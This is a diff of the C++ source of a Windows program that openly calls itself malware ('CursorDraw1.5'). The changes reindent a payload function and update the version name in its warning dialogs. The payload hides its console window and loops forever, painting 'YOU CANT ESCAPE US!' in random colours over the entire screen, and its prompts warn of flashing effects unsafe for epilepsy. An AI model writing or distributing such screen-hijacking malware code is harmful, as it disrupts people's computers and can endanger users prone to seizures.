@@ -313,23 +313,23 @@ DWORD WINAPI Payload2(LPVOID lpParam) {
 }
 
 DWORD WINAPI Payload3(LPVOID lpParam) {
-		int x = GetSystemMetrics(0);
-		int y = GetSystemMetrics(1);
-		LPCSTR text = 0;
-		while (1)
-		{
-			HDC hdc = GetDC(0);
-			SetBkMode(hdc, 0);
-			text = "YOU CANT ESCAPE US!";
-			SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
-			HFONT font = CreateFontA(45, 35, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
-			SelectObject(hdc, font);
-			TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
-			Sleep(0);
-			DeleteObject(font);
-			ReleaseDC(0, hdc);
-		}
+	int x = GetSystemMetrics(0);
+	int y = GetSystemMetrics(1);
+	LPCSTR text = 0;
+	while (1)
+	{
+		HDC hdc = GetDC(0);
+		SetBkMode(hdc, 0);
+		text = "YOU CANT ESCAPE US!";
+		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
+		HFONT font = CreateFontA(45, 35, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
+		SelectObject(hdc, font);
+		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
+		Sleep(0);
+		DeleteObject(font);
+		ReleaseDC(0, hdc);
 	}
+}
 
 VOID WINAPI Sound1() {
 	HWAVEOUT hWaveOut = 0;
@@ -381,13 +381,13 @@ int main()
 
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	if (MessageBoxW(NULL, L"WARNING!!!\r\n\You're About To Run A Malware Named CursorDraw (NoSkid)\r\n\It Doesn't Delete All Your Data", L"CursorDraw (NoSkid)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
+	if (MessageBoxW(NULL, L"WARNING!!!\r\n\You're About To Run A Malware Named CursorDraw1.5 (NoSkid)\r\n\It Doesn't Delete All Your Data", L"CursorDraw (NoSkid)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
 	{
 		ExitProcess(0);
 	}
 	else
 	{
-		if (MessageBoxW(NULL, L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ !!!\r\n\You're About To Run A Malware Named CursorDraw\r\n\it Won't Delete All Your Data\r\n\NOT FOR EPILEPSY", L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ - CursorDraw (Again, NoSkid)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
+		if (MessageBoxW(NULL, L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ !!!\r\n\You're About To Run A Malware Named CursorDraw1.5\r\n\it Won't Delete All Your Data\r\n\NOT FOR EPILEPSY", L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ - CursorDraw (Again, NoSkid)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
 		{
 			ExitProcess(0);
 		}
